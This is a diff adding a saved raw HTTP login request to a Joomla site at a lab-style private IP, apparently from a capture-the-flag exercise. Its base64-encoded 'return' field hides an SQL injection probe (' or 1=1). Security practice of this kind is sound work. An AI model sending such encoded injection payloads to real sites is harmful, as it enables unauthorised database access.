@@ -1,0 +1,15 @@
+POST /index.php/component/users/?task=user.login&Itemid=101 HTTP/1.1
+Host: 10.10.38.148
+Connection: keep-alive
+Content-Length: 182
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.38.148
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.60
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.38.148/index.php/component/users/?view=login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+username=sdf&password=sdf&return=aHR0cDovLzEwLjEwLjM4LjE0OC9pbmRleC5waHAvY29tcG9uZW50L3VzZXJzLz92aWV3PXJlbWluZCZJdGVtaWQ9MTAxJTI3JTIwb3IlMjAxPTE%3D&088ee8b6c2c1f30910350b26b7c05878=1
